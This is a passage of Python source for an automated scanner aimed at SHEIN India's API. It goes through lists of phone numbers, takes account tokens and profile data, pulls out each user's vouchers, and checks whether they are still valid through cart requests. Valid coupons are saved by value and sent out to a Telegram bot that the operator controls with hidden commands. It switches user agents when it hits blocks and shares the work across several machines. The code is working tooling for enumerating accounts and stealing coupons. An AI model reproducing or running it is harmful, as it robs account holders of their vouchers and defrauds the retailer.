            return None, None

        creator_token = self.get_creator_token(phone, encrypted_id)
        if not creator_token:
            return None, None

        profile = self.get_user_profile(creator_token)
        if not profile:
            return None, None

        user_data = profile.get("user_data") or {}
        user_data['creator_token'] = creator_token

        vouchers = self.extract_vouchers(user_data)
        voucher_count = len(vouchers)

        if voucher_count > 0:
            return voucher_count, user_data
        else:
            print("\r" + " " * 80, end="")
            print(f"\r{Fore.BLUE}[{current_index}/{total_numbers}] {phone} - No Voucher | Hits: {self.stats_manager.stats['total_valid_vouchers']}", end="")
            return 0, user_data

    def process_number(self, phone, current_index, total_numbers):
        MAX_ATTEMPTS = 15
        attempt = 0
        while attempt < MAX_ATTEMPTS:
            attempt += 1
            voucher_count, user_data = self._try_once(phone, current_index, total_numbers)

            if voucher_count is None:
                print(f"\r{Fore.RED}[{current_index}/{total_numbers}] {phone} - No Token (retry {attempt}/{MAX_ATTEMPTS}) — retrying...", end="")
                self.consecutive_failures += 1
                if self.consecutive_failures >= UA_SWITCH_AFTER_FAILURES:
                    self.switch_user_agent()
                    self.consecutive_failures = 0
                    print(f"\n{Fore.YELLOW}⚠️ {UA_SWITCH_AFTER_FAILURES} consecutive fails — UA switched")
                    if not self._token_fail_alerted:
                        self._token_fail_alerted = True
                        self.notifier.send_message(
                            f"⚠️ <b>Failed to get token</b>\n"
                            f"💻 <b>Platform:</b> {PLATFORM}\n"
                            f"🔄 All UAs exhausted — still retrying..."
                        )
                time.sleep(1)
                continue

            # Got a response — reset failure tracking
            self.consecutive_failures = 0
            self._token_fail_alerted = False

            if voucher_count > 0 and user_data:
                vouchers = self.extract_vouchers(user_data)
                valid_codes = []
                invalid_codes = []

                # Test ALL vouchers first
                print("\r" + " " * 80, end="")  # clear current line before newline output
                for voucher in vouchers:
                    voucher_code = voucher.get('voucher_code')
                    if not voucher_code:
                        continue

                    # Check min purchase — skip cart validation if >= 1000
                    min_pur = voucher.get('min_purchase_amount', 0)
                    try:
                        min_pur_val = float(min_pur) if min_pur else 0
                    except (ValueError, TypeError):
                        min_pur_val = 0

                    if min_pur_val >= 1000:
                        with open("mpurchase.txt", "a", encoding="utf-8") as f:
                            f.write(f"{voucher_code}\n")
                        print(f"\n{Fore.YELLOW}[{current_index}/{total_numbers}] {phone} - 🛒 MIN PURCHASE: {voucher_code} (₹{int(min_pur_val)}) | Hits: {self.stats_manager.stats['total_hits']}")
                        continue

                    # Check expiry before cart validation
                    expiry_date = voucher.get('expiry_date', '')
                    if expiry_date:
                        try:
                            expiry_str = expiry_date.split('T')[0] if 'T' in expiry_date else expiry_date[:10]
                            expiry_obj = _date.fromisoformat(expiry_str)
                            if expiry_obj < _date.today():
                                continue
                        except Exception:
                            pass

                    print(f"\n{Fore.CYAN}[{current_index}/{total_numbers}] {phone} - Testing voucher: {voucher_code}..." + " " * 10, end="", flush=True)
                    is_valid, _, _ = self.add_voucher_to_cart(voucher_code)
                    if is_valid:
                        self.stats_manager.stats["total_hits"] += 1
                        self.stats_manager.stats["total_valid_vouchers"] += 1
                        self.stats_manager.save_stats()
                        print(f"\r{Fore.GREEN}[{current_index}/{total_numbers}] {phone} - ✅ (200 OK) VALID: {voucher_code} | Valid: {self.stats_manager.stats['total_valid_vouchers']}")
                        valid_codes.append(voucher_code)
                        self.remove_voucher_from_cart(voucher_code)
                    else:
                        print(f"\r{Fore.RED}[{current_index}/{total_numbers}] {phone} - ❌ Redeemed: {voucher_code} | Valid: {self.stats_manager.stats['total_valid_vouchers']}")
                        invalid_codes.append(voucher_code)

                # Send alert(s) with full picture of valid + invalid
                valid_found = bool(valid_codes)
                for voucher_code in valid_codes:
                    self.save_valid_voucher(phone, voucher_code, user_data)
                    self.notifier.send_voucher_alert(phone, user_data, voucher_code, invalid_codes)

                if valid_found:
                    self.stats_manager.update_scan_stats(
                        has_voucher=True,
                        valid_count=len(valid_codes),
                        total_tested=len(valid_codes) + len(invalid_codes)
                    )
                else:
                    self.stats_manager.update_scan_stats(
                        has_voucher=bool(invalid_codes),
                        valid_count=0,
                        total_tested=len(invalid_codes),
                        invalid_voucher=True
                    )
            return

        # Exhausted all attempts — skip to next number
        print(f"\r{Fore.YELLOW}[{current_index}/{total_numbers}] {phone} - Skipped (no token after {MAX_ATTEMPTS} tries)" + " "*20)
        self.stats_manager.update_scan_stats(no_token=True)


def get_last_progress():
    try:
        if os.path.exists(PROGRESS_FILE):
            with open(PROGRESS_FILE, "r") as f:
                data = f.read().strip()
                return int(data) if data else 0
    except Exception:
        pass
    return 0


def save_progress(index):
    try:
        with open(PROGRESS_FILE, "w") as f:
            f.write(str(index))
    except Exception:
        pass


def _looks_like_phone_numbers(lines):
    """Detect phone number files by sampling the first 50 lines only.
    No need to scan a 10MB file — if the first 50 lines are digits, it's a phone file.
    Phone lines: 7-15 chars, digits only (optionally prefixed with + - space)."""
    sample = lines[:20]
    if not sample:
        return False
    phone_count = sum(
        1 for l in sample
        if l.replace("+", "").replace("-", "").replace(" ", "").isdigit()
        and 7 <= len(l.replace("+", "").replace("-", "").replace(" ", "")) <= 15
    )
    return phone_count / len(sample) >= 0.7


def run_scan_job(scanner, notifier, stats_manager, all_numbers, source_label, progress_file=None):
    """Run a full scan over all_numbers. Used by main() and standby file-upload jobs."""
    global _standby_mode
    part_info = f" • {PLATFORM}"
    pfile = progress_file or PROGRESS_FILE

    last_index = 0
    if progress_file is None:
        last_index = get_last_progress()

    if last_index > 0 and last_index < len(all_numbers):
        numbers = all_numbers[last_index:]
        print(f"{Fore.YELLOW}Resuming from number {last_index + 1}/{len(all_numbers)}")
        notifier.send_message(f"🔄 <b>Resumed{part_info}</b>  |  From {last_index + 1}/{len(all_numbers)} | {source_label}")
    else:
        numbers = all_numbers
        last_index = 0
        print(f"{Fore.YELLOW}Starting scan: {source_label}")
        notifier.send_message(f"▶️ <b>Started{part_info}</b>  |  {len(all_numbers)} numbers | {source_label}")

    print(f"{Fore.YELLOW}Loaded {len(all_numbers)} numbers, scanning {len(numbers)} remaining\n")

    start = time.time()
    current_global_index = last_index

    try:
        for i, number in enumerate(numbers, 1):
            current_global_index = last_index + i
            scanner.process_number(number, current_global_index, len(all_numbers))
            save_progress(current_global_index)
            time.sleep(0.096)

    except KeyboardInterrupt:
        elapsed = time.time() - start
        print(f"\n\n{Fore.YELLOW}Stopped at number {current_global_index}/{len(all_numbers)}")
        final_stats = stats_manager.get_stats()
        stats_manager.push_to_remote()
        notifier.send_message(
            f"⏹️ <b>Stopped{part_info}</b>\n\n"
            f"📍 <b>Progress:</b> {current_global_index}/{len(all_numbers)}\n"
            f"📊 <b>Total Scanned:</b> {final_stats['total_scanned']}\n"
            f"✅ <b>Valid Vouchers:</b> {final_stats['total_valid_vouchers']}\n"
            f"🎟️ <b>Total Vouchers Tested:</b> {final_stats['total_vouchers_checked']}\n"
            f"👥 <b>Users with Vouchers:</b> {final_stats['users_with_vouchers']}\n"
            f"❌ <b>Redeemed Vouchers:</b> {final_stats['invalid_vouchers_count']}\n"
        )
        print(f"{Fore.CYAN}Stats saved to {STATS_FILE}")
        sys.exit(0)

    elapsed = time.time() - start
    final_stats = stats_manager.get_stats()
    speed = len(all_numbers) / elapsed if elapsed > 0 else 0

    # Push this platform's final stats to JSONBin, then read combined totals
    stats_manager.push_to_remote()
    combined, all_platform_data = _jsonbin.get_combined_totals()
    combined_line = ""
    if len(all_platform_data) > 1:
        per_line = "\n".join(
            f"  {p}: {d.get('total_scanned', 0):,} scanned  •  {d.get('total_valid_vouchers', 0)} valid"
            for p, d in sorted(all_platform_data.items())
            if isinstance(d, dict)
        )
        combined_line = (
            f"\n━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>All Instances Combined</b>\n"
            f"{per_line}\n"
            f"📊 <b>Total: {combined['total_scanned']:,} scanned  •  {combined['total_valid_vouchers']} valid</b>"
        )

    notifier.send_message(
        f"✅ <b>Complete!</b>  |  💻 {PLATFORM}  |  {len(all_numbers)} numbers\n\n"
        f"📊 <b>Total Scanned:</b> {final_stats['total_scanned']:,}\n"
        f"✅ <b>Valid Vouchers:</b> {final_stats['total_valid_vouchers']}\n"
        f"🎟️ <b>Total Vouchers Tested:</b> {final_stats['total_vouchers_checked']}\n"
        f"👥 <b>Users with Vouchers:</b> {final_stats['users_with_vouchers']}\n"
        f"❌ <b>Redeemed:</b> {final_stats['invalid_vouchers_count']}\n"
        f"📵 <b>No Token:</b> {final_stats['no_token_count']}\n"
        f"👤 <b>No Account:</b> {final_stats['no_account_count']}\n"
        f"⏱️ <b>Time:</b> {elapsed:.0f}s\n"
        f"⚡ <b>Speed:</b> {speed:.1f} numbers/sec"
        f"{combined_line}"
    )

    if os.path.exists(pfile):
        os.remove(pfile)

    print(f"\n{Fore.GREEN}{'='*60}")
    print(f"{Fore.GREEN}COMPLETE! Entering standby mode — upload a new numbers file to continue.")
    print(f"{Fore.GREEN}{'='*60}")
    _standby_mode = True

COMMAND_MAP = {
    "/lalala500":  "500_coupon.txt",
    "/lalala1000": "1000_coupon.txt",
    "/lalala2000": "2000_coupon.txt",
    "/lalala4000": "4000_coupon.txt",
}

# ── Global state — declared here so all functions can reference them ──
_active_scanner  = None
_standby_mode    = False
_scan_lock       = threading.Lock()
_pending_scan    = {}   # uid -> {numbers, filename}
_local_stats_manager = None  # set in main()

_CHECK_CLAIM_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

def _set_pc_claim(uid):
    """Write claim: store the update_id PC is handling into bot's short description."""
    try:
        requests.post(f"{_CHECK_CLAIM_URL}/setMyShortDescription",
                      json={"short_description": f"{PLATFORM}:{uid}"}, timeout=5)
    except Exception:
        pass

def _clear_pc_claim():
    try:
        requests.post(f"{_CHECK_CLAIM_URL}/setMyShortDescription",
                      json={"short_description": ""}, timeout=5)
    except Exception:
        pass

def _pc_has_claimed(uid):
    """Check if any PC instance already claimed this update_id."""
    try:
        r = requests.get(f"{_CHECK_CLAIM_URL}/getMyShortDescription", timeout=5)
        desc = r.json().get("result", {}).get("short_description", "")
        # desc format: "PLATFORM:uid"
        if ":" in desc:
            claimed_uid = desc.split(":", 1)[1]
            return claimed_uid == str(uid)
        return False
    except Exception:
        return False

def _should_i_reply(uid):
    """Exactly one machine should send a reply for shared commands like /ping and /help.

    Strategy:
      - Alphabetically first alive platform = "primary" (rank 0) → sends immediately,
        then writes REPLIED:<uid> to short_description so others know to skip.
      - All other platforms wait 1.5s, then read short_description.
        If REPLIED:<uid> is there → skip. Otherwise → send (primary was offline).
    """
    try:
        reg = _read_registry()
        now = int(time.time())
        alive = sorted([n for n, e in reg.items()
                        if isinstance(e, dict) and (now - e.get("ts", 0)) <= 30])
    except Exception:
        alive = []
    if PLATFORM not in alive:
        alive = sorted(alive + [PLATFORM])

    if alive[0] == PLATFORM:
        # We are primary — send and flag it
        try:
            requests.post(f"{_CHECK_CLAIM_URL}/setMyShortDescription",
                          json={"short_description": f"REPLIED:{uid}"}, timeout=5)
        except Exception:
            pass
        return True
    else:
        # We are secondary — wait then check if primary already replied
        time.sleep(1.5)
        try:
            r = requests.get(f"{_CHECK_CLAIM_URL}/getMyShortDescription", timeout=5)
            stored = r.json().get("result", {}).get("short_description", "")
            if stored == f"REPLIED:{uid}":
                return False  # primary handled it
        except Exception:
            pass
        # Primary didn't reply (offline?) — we send as fallback
        return True
# Ping + stats registry stored in bot description as shared KV across all instances
# Structure: { "PC": {"ts": 1234567890, "scanned": 50000, "valid": 12}, ... }
_PING_REGISTRY_KEY = "ping_registry"

def _read_registry():
    """Fetch the shared registry dict from bot description."""
    try:
        r = requests.get(f"{_CHECK_CLAIM_URL}/getMyDescription", timeout=5)
        desc = r.json().get("result", {}).get("description", "") or ""
        if desc.startswith("{"):
            return json.loads(desc)
    except Exception:
        pass
    return {}

def _write_registry(registry):
    """Write the shared registry dict back to bot description."""
    try:
        requests.post(f"{_CHECK_CLAIM_URL}/setMyDescription",
                      json={"description": json.dumps(registry)}, timeout=5)
    except Exception:
        pass

def _register_ping():
    """Register this instance as alive and publish its current stats."""
    try:
        registry = _read_registry()
        entry = {"ts": int(time.time())}
        if _local_stats_manager is not None:
            s = _local_stats_manager.stats
            entry["scanned"]  = s.get("total_scanned", 0)
            entry["valid"]    = s.get("total_valid_vouchers", 0)
            entry["tested"]   = s.get("total_vouchers_checked", 0)
            entry["users"]    = s.get("users_with_vouchers", 0)
            entry["redeemed"] = s.get("invalid_vouchers_count", 0)
            entry["hits"]     = s.get("total_hits", 0)
            entry["no_token"] = s.get("no_token_count", 0)
            entry["no_acct"]  = s.get("no_account_count", 0)
        registry[PLATFORM] = entry
        _write_registry(registry)
    except Exception:
        pass


def _get_ping_status():
    """Return raw registry dict {name: {ts, scanned, valid, ...}}."""
    return _read_registry()

def _get_combined_stats():
    """Sum stats across all instances in the registry."""
    registry = _read_registry()
    totals = {"scanned": 0, "valid": 0, "tested": 0, "users": 0, "redeemed": 0}
    for name, entry in registry.items():
        if not isinstance(entry, dict):
            continue
        for k in totals:
            totals[k] += entry.get(k, 0)
    return totals, registry

def start_collector_bot():
    """Background thread — polls recent messages without offset so all machines see every command."""
    # Record bot start time — only respond to commands sent AFTER this script started
    start_time = int(time.time()) - 60  # 60s buffer so recent messages aren't missed
    seen_ids = set()  # track update IDs already handled by THIS machine

    def get_recent_updates():
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates",
                params={"limit": 100, "allowed_updates": ["message", "document", "callback_query"]},
                timeout=10
            )
            return r.json().get("result", [])
        except Exception:
            return []

    def send_doc(filepath, caption):
        try:
            with open(filepath, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"},
                    files={"document": f},
                    timeout=30
                )
        except Exception:
            pass

    def handle(command):
        filename = COMMAND_MAP.get(command)
        if not filename:
            return
        amount = command.replace("/lalala", "")
        machine_label = f"{PLATFORM}"
        if not os.path.exists(filename):
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"📂 <b>{machine_label}</b>\n❌ No <code>{filename}</code> found.", "parse_mode": "HTML"},
                timeout=10
            )
            return
        with open(filename, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip()]
        if not lines:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"📂 <b>{machine_label}</b>\n⚠️ <code>{filename}</code> is empty.", "parse_mode": "HTML"},
                timeout=10
            )
            return
        temp = f"temp_{amount}_{machine_label.replace(' ', '_')}.txt"
        with open(temp, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        send_doc(temp, f"📂 <b>{machine_label}</b>\n💰 <b>₹{amount} Coupons</b>\n🔢 <b>Count:</b> {len(lines)}")
        try:
            os.remove(temp)
        except Exception:
            pass

    def handle_all():
        machine_label = f"{PLATFORM}"
        any_sent = False
        for command, filename in COMMAND_MAP.items():
            amount = command.replace("/lalala", "")
            if not os.path.exists(filename):
                continue
            with open(filename, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
            if not lines:
                continue
            temp = f"temp_{amount}_{machine_label.replace(' ', '_')}.txt"
            with open(temp, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
            send_doc(temp, f"📂 <b>{machine_label}</b>\n💰 <b>₹{amount} Coupons</b>\n🔢 <b>Count:</b> {len(lines)}")
            try:
                os.remove(temp)
            except Exception:
                pass
            any_sent = True
        if not any_sent:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"📂 <b>{machine_label}</b>\n❌ No coupon files found.", "parse_mode": "HTML"},
                timeout=10
            )

    # Separate session for bot checks — avoids interfering with main scanner session
    bot_check_session = requests.Session()

    # Register this instance on startup
    _register_ping()
    _last_ping_time = [time.time()]

    def handle_check(codes):
        """Check a list of voucher codes via cart API and report results."""
        if not _active_scanner:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ Scanner not ready yet, try again shortly.", "parse_mode": "HTML"},
                timeout=10
            )
            return

        total = len(codes)
        valid_results = []   # list of (code, amount)
        invalid_results = []
        start_ts = time.time()

        def _build_progress_msg(done, v_count, inv_count):
            filled = int((done / total) * 10) if total > 0 else 0
            bar = "█" * filled + "░" * (10 - filled)
            return (
                f"🔍 <b>Checking</b> [{bar}] {done}/{total}\n"
                f"✅ {v_count}  ❌ {inv_count}"
            )

        # Send initial progress message and get its message_id
        try:
            init_resp = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": _build_progress_msg(0, 0, 0),
                    "parse_mode": "HTML"
                },
                timeout=10
            ).json()
            msg_id = init_resp.get("result", {}).get("message_id")
        except Exception:
            msg_id = None

        def edit_progress(done):
            if not msg_id:
                return
            try:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText",
                    json={
                        "chat_id": TELEGRAM_CHAT_ID,
                        "message_id": msg_id,
                        "text": _build_progress_msg(done, len(valid_results), len(invalid_results)),
                        "parse_mode": "HTML"
                    },
                    timeout=10
                )
            except Exception:
                pass

        def _add_voucher(code):
            """Add voucher to cart. Returns (is_valid, status, reason, api_amount)."""
            h = _active_scanner.get_headers("voucher_validation")
            add_url = (
                f"https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl"
                f"/users/anonymous/carts/{_active_scanner.cart_id}/vouchers"
                f"?client_type=Android%2F32&client_version=1.0.14"
            )
            try:
                r = requests.post(
                    add_url,
                    headers=h,
                    data=f"voucherId={code}&employeeOfferRestriction=true",
                    timeout=6
                )
                api_amount = None
                if r.status_code == 200:
                    try:
                        rstr = str(r.json())
                        for key in ["voucherValue", "voucher_amount", "discountValue", "value"]:
                            idx = rstr.find(key)
                            if idx != -1:
                                snippet = rstr[idx:idx+30]
                                digits = "".join(c for c in snippet.split(":")[-1] if c.isdigit() or c == ".")
                                if digits:
                                    api_amount = digits.split(".")[0]
                                    break
                    except Exception:
                        pass
                    return True, 200, r.text, api_amount
                else:
                    return False, r.status_code, r.text, None
            except Exception as e:
                return False, 0, str(e), None

        def _remove_voucher(code):
            """Remove voucher from cart. Retries 3x. Returns True if confirmed removed."""
            h = _active_scanner.get_headers("voucher_validation")
            rm_url = (
                f"https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl"
                f"/users/anonymous/carts/{_active_scanner.cart_id}/vouchers/{code}"
                f"?client_type=Android%2F32&client_version=1.0.14"
            )
            for attempt in range(3):
                try:
                    r = requests.post(rm_url, headers=h, timeout=6)
                    if r.status_code == 200:
                        return True
                    # 404 means already not in cart — also fine
                    if r.status_code == 404:
                        return True
                except Exception:
                    pass
                time.sleep(0.4)
            # Final fallback: use main scanner's own method
            try:
                return _active_scanner.remove_voucher_from_cart(code)
            except Exception:
                return False

        # Track the last code successfully added to cart so we can clear it if stuck
        _last_added_code = [None]

        for i, code in enumerate(codes):
            is_valid, status, reason, api_amount = _add_voucher(code)

            # "cart value not enough" → coupon is valid but wasn't added (API rejected at 400)
            if not is_valid and status == 400 and "Your cart value is not enough to use the coupon code" in reason:
                is_valid = True
                reason = "Valid (min purchase)"
                # Coupon was NOT added to cart — no removal needed

            # Cart is stuck (previous removal failed) → clear it and retry once
            elif not is_valid and _last_added_code[0] and any(
                phrase in reason.lower() for phrase in ["already", "applied", "exists", "in use", "in cart"]
            ):
                # Force remove the stuck code
                _remove_voucher(_last_added_code[0])
                _last_added_code[0] = None
                time.sleep(0.3)
                # Retry this code fresh
                is_valid, status, reason, api_amount = _add_voucher(code)
                if not is_valid and status == 400 and "Your cart value is not enough to use the coupon code" in reason:
                    is_valid = True
                    reason = "Valid (min purchase)"

            if is_valid:
                amount = api_amount
                if not amount:
                    try:
                        for amt_file in ["500_coupon.txt", "1000_coupon.txt", "2000_coupon.txt", "4000_coupon.txt"]:
                            if os.path.exists(amt_file):
                                with open(amt_file, "r") as af:
                                    if code in af.read():
                                        amount = amt_file.replace("_coupon.txt", "")
                                        break
                    except Exception:
                        pass
                if not amount:
                    amount = "?"
                note = " ⚠️ Min purchase required" if "min purchase" in reason.lower() else ""
                valid_results.append((code, amount, note))

                if "min purchase" not in reason.lower():
                    # Coupon IS in cart (status 200) — must remove before next check
                    removed = _remove_voucher(code)
                    if removed:
                        _last_added_code[0] = None
                    else:
                        # Could not remove — track it so next iteration can recover
                        _last_added_code[0] = code
                # "min purchase" → coupon was never added, nothing to remove
            else:
                invalid_results.append(code)

            edit_progress(i + 1)

        elapsed = time.time() - start_ts

        # ── Build and send results file ──────────────────────────────────────
        file_lines = []
        file_lines.append("VALID")
        if valid_results:
            for code, amount, note in valid_results:
                suffix = f"  # ₹{amount}{note}" if amount != "?" else note
                file_lines.append(f"{code}{suffix}")
        else:
            file_lines.append("(none)")
        file_lines.append("")
        file_lines.append("INVALID")
        if invalid_results:
            file_lines.extend(invalid_results)
        else:
            file_lines.append("(none)")

        result_filename = f"check_results_{int(time.time())}.txt"
        try:
            with open(result_filename, "w", encoding="utf-8") as rf:
                rf.write("\n".join(file_lines) + "\n")
        except Exception:
            result_filename = None

        # Summary caption
        caption = (
            f"{'✅' if valid_results else '❌'} <b>CHECK COMPLETE</b>\n"
            f"Checked: <b>{total}</b>  •  Valid: <b>{len(valid_results)}</b>  •  Invalid: <b>{len(invalid_results)}</b>\n"
            f"Time: {elapsed:.1f}s"
        )

        # Send as file if we have results, otherwise just a message
        sent_file = False
        if result_filename and os.path.exists(result_filename):
            try:
                with open(result_filename, "rb") as rf:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"},
                        files={"document": (result_filename, rf, "text/plain")},
                        timeout=30
                    )
                sent_file = True
            except Exception:
                pass
            try:
                os.remove(result_filename)
            except Exception:
                pass

        if not sent_file:
            # Fallback: send as text message
            if valid_results:
                valid_lines = "\n".join(
                    f"{idx+1}. <code>{code}</code>  ₹{amount}{note}"
                    for idx, (code, amount, note) in enumerate(valid_results)
                )
                body = f"🎉 <b>VALID:</b>\n{valid_lines}"
            else:
                body = "No valid coupons found."
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"{caption}\n\n{body}", "parse_mode": "HTML"},
                timeout=10
            )

    def download_txt_lines(file_id):
        """Download a Telegram .txt file and return raw stripped non-empty lines.
        Casing is preserved — caller decides whether to upper() for coupon use."""
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getFile",
                params={"file_id": file_id},
                timeout=10
            )
            file_path = r.json().get("result", {}).get("file_path")
            if not file_path:
                return None
            content_r = requests.get(
                f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file_path}",
                timeout=30  # bigger timeout for large files
            )
            raw = [l.strip() for l in content_r.text.splitlines() if l.strip()]
            return raw if raw else None
        except Exception:
            return None

    def dispatch_check(codes, update_uid):
        """Pick exactly one alive machine at random to handle /check.
        Uses the same _should_i_reply mechanism as /ping and /help —
        primary is chosen randomly from alive instances each time."""
        import random

        def _run_check(check_codes, claim_uid):
            # Get alive machines and pick one randomly as the handler
            try:
                reg = _read_registry()
                now = int(time.time())
                alive = [n for n, e in reg.items()
                         if isinstance(e, dict) and (now - e.get("ts", 0)) <= 30]
            except Exception:
                alive = []
            if PLATFORM not in alive:
                alive.append(PLATFORM)

            # Use update_uid as seed so all machines pick the SAME random winner
            rng = random.Random(claim_uid)
            chosen = rng.choice(sorted(alive))

            if chosen != PLATFORM:
                return  # another machine was chosen

            # We were chosen — claim it to prevent any edge-case double-fire
            _set_pc_claim(claim_uid)
            time.sleep(0.2)
            # Verify claim still ours (handles rare case of two machines with same name)
            if not _pc_has_claimed(claim_uid):
                return

            try:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🔍 <b>[{PLATFORM}] Handling /check...</b>", "parse_mode": "HTML"},
                    timeout=5
                )
            except Exception:
                pass

            try:
                handle_check(check_codes)
            finally:
                _clear_pc_claim()

        threading.Thread(target=_run_check, args=(codes, update_uid), daemon=True).start()

    while True:
        try:
            updates = get_recent_updates()
            for update in updates:
                uid = update["update_id"]
                if uid in seen_ids:
                    continue  # already handled

                # ── Handle callback_query (inline button taps) ──
                if update.get("callback_query"):
                    seen_ids.add(uid)
                    cq = update["callback_query"]
                    cq_id = cq.get("id")
                    cq_data = cq.get("data", "")
                    cq_chat_id = str(cq.get("message", {}).get("chat", {}).get("id", ""))

                    # Acknowledge button tap
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                            json={"callback_query_id": cq_id},
                            timeout=5
                        )
                    except Exception:
                        pass

                    if cq_data.startswith("scan:") and cq_chat_id == TELEGRAM_CHAT_ID:
                        _, job_uid_str, target_instance = cq_data.split(":", 2)
                        job_uid = int(job_uid_str)

                        if target_instance == PLATFORM and job_uid in _pending_scan:
                            job = _pending_scan[job_uid]
                            numbers = job["numbers"]
                            filename = job["filename"]
                            is_busy = not _standby_mode and _active_scanner is not None

                            if is_busy:
                                # Machine is already scanning — ask for reconfirmation
                                confirm_keyboard = {
                                    "inline_keyboard": [[
                                        {"text": "✅ Yes, replace", "callback_data": f"confirm:{job_uid}:{target_instance}"},
                                        {"text": "❌ Cancel",       "callback_data": f"cancel:{job_uid}:{target_instance}"}
                                    ]]
                                }
                                try:
                                    requests.post(
                                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                        json={
                                            "chat_id": TELEGRAM_CHAT_ID,
                                            "text": (
                                                f"⚠️ <b>[{PLATFORM}] is currently scanning!</b>\n\n"
                                                f"📄 <code>{filename}</code>  •  {len(numbers)} numbers\n\n"
                                                f"Replace the current scan with this file?"
                                            ),
                                            "parse_mode": "HTML",
                                            "reply_markup": confirm_keyboard
                                        },
                                        timeout=10
                                    )
                                except Exception:
                                    pass
                            else:
                                # Not busy — start immediately
                                _pending_scan.pop(job_uid, None)
                                def _run_upload_scan(nums, fname_label):
                                    global _standby_mode
                                    with _scan_lock:
                                        _standby_mode = False
                                        if os.path.exists(PROGRESS_FILE):
                                            os.remove(PROGRESS_FILE)
                                        run_scan_job(
                                            _active_scanner,
                                            _active_scanner.notifier,
                                            _active_scanner.stats_manager,
                                            nums,
                                            fname_label
                                        )
                                try:
                                    requests.post(
                                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                        json={
                                            "chat_id": TELEGRAM_CHAT_ID,
                                            "text": f"▶️ <b>[{PLATFORM}]</b> Starting scan of <code>{filename}</code> — {len(numbers)} numbers",
                                            "parse_mode": "HTML"
                                        },
                                        timeout=10
                                    )
                                except Exception:
                                    pass
                                threading.Thread(target=_run_upload_scan, args=(numbers, filename), daemon=True).start()

                    elif cq_data.startswith("confirm:") and cq_chat_id == TELEGRAM_CHAT_ID:
                        _, job_uid_str, target_instance = cq_data.split(":", 2)
                        job_uid = int(job_uid_str)
                        if target_instance == PLATFORM and job_uid in _pending_scan:
                            job = _pending_scan.pop(job_uid)
                            numbers = job["numbers"]
                            filename = job["filename"]
                            def _run_replace_scan(nums, fname_label):
                                global _standby_mode
                                with _scan_lock:
                                    _standby_mode = False
                                    if os.path.exists(PROGRESS_FILE):
                                        os.remove(PROGRESS_FILE)
                                    run_scan_job(
                                        _active_scanner,
                                        _active_scanner.notifier,
                                        _active_scanner.stats_manager,
                                        nums,
                                        fname_label
                                    )
                            try:
                                requests.post(
                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                    json={
                                        "chat_id": TELEGRAM_CHAT_ID,
                                        "text": f"🔄 <b>[{PLATFORM}]</b> Replacing scan with <code>{filename}</code> — {len(numbers)} numbers",
                                        "parse_mode": "HTML"
                                    },
                                    timeout=10
                                )
                            except Exception:
                                pass
                            threading.Thread(target=_run_replace_scan, args=(numbers, filename), daemon=True).start()

                    elif cq_data.startswith("cancel:") and cq_chat_id == TELEGRAM_CHAT_ID:
                        _, job_uid_str, target_instance = cq_data.split(":", 2)
                        job_uid = int(job_uid_str)
                        if target_instance == PLATFORM:
                            _pending_scan.pop(job_uid, None)
                            try:
                                requests.post(
                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"❌ <b>[{PLATFORM}]</b> Upload cancelled.", "parse_mode": "HTML"},
                                    timeout=10
                                )
                            except Exception:
                                pass

                    continue  # done with this callback_query update

                msg = update.get("message", {})
                msg_time = msg.get("date", 0)
                if msg_time < start_time:
                    seen_ids.add(uid)
                    continue  # message is older than this script run, skip
                raw_text = msg.get("text", "")
                lines = raw_text.strip().splitlines()
                text = lines[0].strip().lower().split()[0] if lines else ""
                chat_id = str(msg.get("chat", {}).get("id", ""))
                if chat_id == TELEGRAM_CHAT_ID:
                    seen_ids.add(uid)
                    if text in COMMAND_MAP:
                        handle(text)
                    elif text == "/lalala":
                        handle_all()
                    elif text == "/stopw":
                        if PLATFORM == "Windows" or PLATFORM.startswith("PC"):
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
